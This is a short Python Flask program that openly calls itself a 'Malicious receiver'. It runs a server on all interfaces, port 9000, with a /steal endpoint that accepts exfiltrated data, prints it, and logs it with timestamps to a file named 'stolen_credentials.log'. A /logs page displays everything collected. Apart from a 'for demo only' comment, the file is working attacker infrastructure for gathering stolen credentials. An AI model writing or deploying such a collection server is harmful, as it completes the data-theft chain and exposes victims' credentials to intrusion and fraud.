from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

# Global storage (for demo only)
stolen_logs = []

# Log file path
LOG_FILE = "stolen_credentials.log"

def log_to_file(data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {data}\n")

@app.route("/", methods=["GET"])
def home():
    return "<h1>Malicious receiver is running</h1>"

@app.route("/steal", methods=["POST"])
def steal():
    try:
        stolen_data = request.get_data(as_text=True)
        print(f"[🚨] Exfiltrated data received: {stolen_data}")
        stolen_logs.append(stolen_data)
        log_to_file(stolen_data)
    except Exception as e:
        print(f"⚠️ Error reading data: {e}")
    return '', 204

@app.route("/logs", methods=["GET"])
def logs():
    if not stolen_logs:
        return "No data received yet."
    return "<br>".join(stolen_logs)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9000)